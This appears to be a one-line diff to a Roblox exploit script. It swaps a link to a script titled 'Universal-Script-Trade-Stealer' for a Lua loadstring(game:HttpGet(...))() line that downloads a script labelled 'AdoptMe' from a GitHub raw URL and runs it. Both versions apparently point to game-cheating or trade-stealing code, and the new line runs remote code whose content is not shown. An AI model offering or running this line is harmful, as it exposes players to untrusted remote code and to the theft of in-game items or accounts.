@@ -1,1 +1,1 @@
-https://rawscripts.net/raw/Universal-Script-Trade-Stealer-34808
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicBIoxxer/Free/refs/heads/main/AdoptMe", true))()
